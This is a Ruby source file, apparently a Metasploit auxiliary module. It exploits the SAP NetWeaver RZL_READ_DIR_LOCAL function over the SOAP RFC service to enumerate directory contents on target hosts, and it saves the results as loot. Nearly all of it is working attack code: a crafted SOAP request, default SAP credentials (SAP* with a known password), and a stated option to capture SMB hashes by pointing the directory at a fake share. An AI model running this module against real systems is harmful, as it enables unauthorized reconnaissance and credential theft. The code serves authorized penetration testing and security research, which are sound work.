##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'rexml/document'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing',
      'Description' => %q{
          This module exploits the SAP NetWeaver RZL_READ_DIR_LOCAL function, on the SAP
        SOAP RFC Service, to enumerate directory contents. It returns only the first 32
        characters of the filename since they are truncated. The module can also be used to
        capture SMB hashes by using a fake SMB share as DIR.
      },
      'References' => [
        [ 'OSVDB', '92732'],
        [ 'URL', 'http://erpscan.com/advisories/dsecrg-12-026-sap-netweaver-rzl_read_dir_local-missing-authorization-check-and-smb-relay-vulnerability/' ]
      ],
      'Author' =>
        [
          'Alexey Tyurin', # Vulnerability discovery
          'nmonkee' # Metasploit module
        ],
      'License' => MSF_LICENSE
    )

    register_options([
      OptString.new('CLIENT', [true, 'SAP Client', '001']),
      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
      OptString.new('HttpPassword', [true, 'Password', '06071992']),
      OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])
    ])
  end

  def parse_xml(xml_data)
    files = []
    xml_doc = REXML::Document.new(xml_data)
    xml_doc.root.each_element('//item') do |item|
      name = size = nil
      item.each_element do |elem|
        name = elem.text if elem.name == "NAME"
        size = elem.text if elem.name == "SIZE"
        break if name and size
      end
      if (name and size) and not (name.empty? or size.empty?)
        files << { "name" => name, "size" => size }
      end
    end
    return files
  end

  def run_host(ip)
    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
    data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
    data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '<SOAP-ENV:Header/>'
    data << '<SOAP-ENV:Body>'
    data << '<RZL_READ_DIR_LOCAL xmlns="urn:sap-com:document:sap:rfc:functions">'
    data << '<FILE_TBL>'
    data << '<item>'
    data << '<NAME></NAME>'
    data << '<SIZE></SIZE>'
    data << '</item>'
    data << '</FILE_TBL>'
    data << '<NAME>' + datastore['DIR'] + '</NAME>'
    data << '</RZL_READ_DIR_LOCAL>'
    data << '</SOAP-ENV:Body>'
    data << '</SOAP-ENV:Envelope>'

    begin
      vprint_status("#{rhost}:#{rport} - Sending request to enumerate #{datastore['DIR']}")
      res = send_request_cgi({
        'uri' => '/sap/bc/soap/rfc',
        'method' => 'POST',
        'data' => data,
        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
        'ctype' => 'text/xml; charset=UTF-8',
        'headers' => {
          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
        },
        'vars_get' => {
          'sap-client' => datastore['CLIENT'],
          'sap-language' => 'EN'
        }
      })
      if res and res.code == 200 and res.body =~ /rfc:RZL_READ_DIR_LOCAL.Response/
        files = parse_xml(res.body)
        path = store_loot("sap.soap.rfc.dir", "text/xml", rhost, res.body, datastore['DIR'])
        print_good("#{rhost}:#{rport} - #{datastore['DIR']} successfully enumerated, results stored on #{path}")
        files.each { |f|
          vprint_line("Entry: #{f["name"]}, Size: #{f["size"].to_i}")
        }
      end
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Unable to connect")
      return
    end
  end
end
